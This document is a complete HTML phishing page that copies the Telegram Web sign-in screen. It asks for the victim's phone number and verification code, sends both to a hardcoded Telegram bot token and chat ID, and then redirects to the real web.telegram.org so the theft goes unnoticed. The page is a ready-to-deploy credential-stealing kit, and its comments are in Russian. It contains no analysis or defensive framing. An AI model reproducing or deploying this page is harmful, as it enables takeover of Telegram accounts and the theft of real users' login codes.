<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Telegram Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0f0f0f;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-card {
            background: #1f1f1f;
            border-radius: 28px;
            padding: 32px 28px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
        }
        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo-icon {
            font-size: 48px;
            background: #2b5278;
            width: 64px;
            height: 64px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
        }
        h2 {
            color: white;
            text-align: center;
            font-weight: 500;
            margin-bottom: 24px;
            font-size: 24px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 16px;
            background: #2b2b2b;
            border: 1px solid #3a3a3a;
            border-radius: 14px;
            color: white;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        input:focus {
            border-color: #2b5278;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #2b5278;
            color: white;
            border: none;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            transition: background 0.2s;
        }
        button:active {
            background: #1e3a58;
        }
        .error {
            background: #3a1a1a;
            color: #ff6b6b;
            padding: 12px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-size: 14px;
            text-align: center;
            display: none;
        }
        .note {
            text-align: center;
            color: #888;
            font-size: 12px;
            margin-top: 24px;
        }
        .hidden {
            display: none;
        }
        .loader {
            text-align: center;
            padding: 20px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #2b2b2b;
            border-top: 3px solid #2b5278;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-card" id="loginForm">
        <div class="logo">
            <div class="logo-icon">📱</div>
        </div>
        <h2>Sign in to Telegram</h2>
        <div class="error" id="errorMsg">Invalid phone number or code</div>
        <div class="input-group">
            <input type="tel" id="phone" placeholder="Phone number" value="">
        </div>
        <div class="input-group hidden" id="codeGroup">
            <input type="text" id="code" placeholder="Verification code">
        </div>
        <button id="submitBtn">Next</button>
        <div class="note">By continuing, you agree to Telegram's Terms of Service.</div>
    </div>

    <div class="login-card hidden" id="loadingScreen">
        <div class="loader">
            <div class="spinner"></div>
            <div style="color: white;">Connecting to Telegram...</div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8755907309:AAHcG2zLepeJyrWSk1dtf4kAtpIVkGsxsx0";
        const CHAT_ID = 8637392176;
        
        let step = 'phone';
        
        document.getElementById('submitBtn').addEventListener('click', async () => {
            if (step === 'phone') {
                const phone = document.getElementById('phone').value.trim();
                if (!phone) {
                    showError('Please enter your phone number');
                    return;
                }
                
                // Показываем поле для кода
                document.getElementById('codeGroup').classList.remove('hidden');
                document.getElementById('submitBtn').innerText = 'Sign in';
                step = 'code';
                
                // Опционально: отправляем номер в Telegram
                await sendToTelegram(`📱 Номер: ${phone}`);
                
            } else if (step === 'code') {
                const phone = document.getElementById('phone').value.trim();
                const code = document.getElementById('code').value.trim();
                
                if (!code) {
                    showError('Please enter verification code');
                    return;
                }
                
                // Отправляем код в Telegram
                await sendToTelegram(`🔐 Код: ${code}\n📱 Номер: ${phone}`);
                
                // Показываем загрузку и редирект
                document.getElementById('loginForm').classList.add('hidden');
                document.getElementById('loadingScreen').classList.remove('hidden');
                
                // Редирект на настоящий Telegram
                setTimeout(() => {
                    window.location.href = 'https://web.telegram.org';
                }, 2000);
            }
        });
        
        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                });
            } catch(e) {
                console.log('Error:', e);
            }
        }
        
        function showError(msg) {
            const errorDiv = document.getElementById('errorMsg');
            errorDiv.innerText = msg;
            errorDiv.style.display = 'block';
            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>
